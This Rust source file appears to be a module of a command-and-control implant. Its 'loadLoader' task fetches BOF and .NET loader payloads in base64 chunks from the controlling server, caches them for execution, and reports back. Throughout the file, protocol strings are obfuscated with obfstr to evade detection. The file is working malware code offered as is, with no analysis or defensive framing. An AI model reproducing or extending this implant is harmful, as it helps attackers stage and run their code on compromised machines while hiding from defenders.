use serde::Deserialize;
use serde_json::{Value, json};
use base64::engine::general_purpose;
use base64::Engine;
use obfstr::obfstr;

const CHUNK_SIZE: usize = 4096;

#[derive(Deserialize)]
struct LoadLoaderParams {
    #[serde(default)]
    bof_loader_file_id: String,
    #[serde(default)]
    dot_loader_file_id: String,
}

fn download_file(task_id: &str, file_id: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let mut file_bytes = Vec::new();
    let mut chunk_num = 1;
    let mut total_chunks = 1;

    while chunk_num <= total_chunks {
        let payload = json!({
            obfstr!("action"): obfstr!("post_response"),
            obfstr!("responses"): [{
                obfstr!("upload"): {
                    obfstr!("chunk_size"): CHUNK_SIZE,
                    obfstr!("file_id"): file_id,
                    obfstr!("chunk_num"): chunk_num,
                },
                obfstr!("task_id"): task_id,
                obfstr!("completed"): true
            }]
        })
        .to_string();
        let resp: Value = crate::transport::send_request_with_response(&payload)?;
        let entry = &resp[obfstr!("responses")][0];
        total_chunks = entry[obfstr!("total_chunks")].as_u64().ok_or("Bad `total_chunks`")? as usize;
        let chunk_data = entry[obfstr!("chunk_data")].as_str().ok_or("Missing `chunk_data`")?;
        let bytes = general_purpose::STANDARD.decode(chunk_data)?;
        file_bytes.extend_from_slice(&bytes);
        chunk_num += 1;
    }

    Ok(file_bytes)
}

pub fn loadLoader(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
    let id = task.get("id").and_then(Value::as_str).ok_or("Missing `id`")?;
    let raw = task.get("parameters").and_then(Value::as_str).ok_or("Missing `parameters`")?;
    let params: LoadLoaderParams = serde_json::from_str(raw)?;

    let mut staged = Vec::new();

    if !params.bof_loader_file_id.is_empty() {
        crate::helpers::churn("bof_loader");
        let bytes = download_file(id, &params.bof_loader_file_id)?;
        crate::loader_cache::store(&crate::loader_cache::LoaderKind::Bof, bytes);
        staged.push("bof");
    }

    if !params.dot_loader_file_id.is_empty() {
        crate::helpers::churn("dot_loader");
        let bytes = download_file(id, &params.dot_loader_file_id)?;
        crate::loader_cache::store(&crate::loader_cache::LoaderKind::Dot, bytes);
        staged.push("dot");
    }

    let output = if staged.is_empty() {
        "No loaders staged".to_string()
    } else {
        format!("Staged loaders: {}", staged.join(", "))
    };

    let done = json!({
        obfstr!("action"): obfstr!("post_response"),
        obfstr!("responses"): [{
            obfstr!("task_id"): id,
            obfstr!("user_output"): output,
            obfstr!("status"): "success",
            obfstr!("completed"): true
        }]
    })
    .to_string();
    crate::transport::send_request(&done)?;
    Ok(())
}
